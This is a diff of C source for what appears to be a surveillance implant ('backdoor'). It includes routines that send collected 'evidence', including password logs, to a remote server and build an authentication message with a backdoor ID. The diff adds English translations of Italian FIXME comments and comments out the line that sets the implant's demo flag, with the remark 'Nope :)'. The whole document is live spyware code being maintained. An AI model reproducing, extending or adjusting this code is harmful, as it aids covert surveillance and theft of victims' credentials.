@@ -172,7 +172,7 @@ BOOL ProtoId()
 						continue;
 					}
 
-					if (lpProtoUpgrade) // FIXME check che c'e' abbastanza buffah (upgradenamelen + dwfilesize
+					if (lpProtoUpgrade) // FIXME check che c'e' abbastanza buffah (upgradenamelen + dwfilesize) | Check that there is' enough buffahhh
 					{
 						LPWSTR strUpgradeName = (LPWSTR) zalloc(lpProtoUpgrade->uUpgradeNameLen + sizeof(WCHAR));
 						memcpy(strUpgradeName, &lpProtoUpgrade->pUpgradeNameBuffer, lpProtoUpgrade->uUpgradeNameLen);
@@ -606,7 +606,7 @@ BOOL ProtoEvidences()
 
 		if (dwEvSize != 0 && lpEvBuffer != NULL)
 		{
-			if (SendEvidence(lpEvBuffer, dwEvSize)) // FIXME: free evidence solo se GetResponse == OK
+			if (SendEvidence(lpEvBuffer, dwEvSize)) // FIXME: free evidence solo se GetResponse == OK | free evidence only if GetResponse == OK
 			{
 				lpPasswordLogs.lpBuffer = 0;
 				lpPasswordLogs.dwSize = 0;
@@ -627,7 +627,7 @@ BOOL ProtoEvidences()
 				OutputDebugString(L"\r\n[LOG] Sending log evidence\r\n");
 			#endif
 
-//			if(SendEvidence(lpEvBuffer, dwEvSize)) // FIXME: free evidence solo se GetResponse == OK
+//			if(SendEvidence(lpEvBuffer, dwEvSize)) // FIXME: free evidence solo se GetResponse == OK | free evidence only if GetResponse == OK
 
 			if(SendEvidence_Encrypt(lpEvBuffer, dwEvSize))
 			{
@@ -757,20 +757,22 @@ LPSTR ProtoMessageAuth()
 	memcpy(lpProtoCommand->Sha1, pHashBuffer, sizeof(lpProtoCommand->Sha1));
 	zfree(lpKD);
 
-	// backdoor_id
+	// backdoor_id TODO: find all references to this for sanity check
 	memcpy(lpProtoCommand->BdoorID, BACKDOOR_ID, min(sizeof(lpProtoCommand->BdoorID), strlen(BACKDOOR_ID)));
 	
 	// instance id
 	LPBYTE lpInstanceId = GetUserUniqueHash();
 	memcpy(lpProtoCommand->InstanceID, lpInstanceId, sizeof(lpProtoCommand->InstanceID));
 	zfree(lpInstanceId);
-
+	
+	//Nope :)
 	/* 
 		determine whether it's a demo scout or not :
 		- cautiously set demo to 0 (i.e. not demo)
 		- if stars align properly set to demo
-	*/ 
-	lpProtoCommand->SubType.Demo = 0x0;
+	 
+	lpProtoCommand->SubType.Demo = 0x0; 
+	*/
 
 	SHA1Context sha;
 	SHA1Reset(&sha);
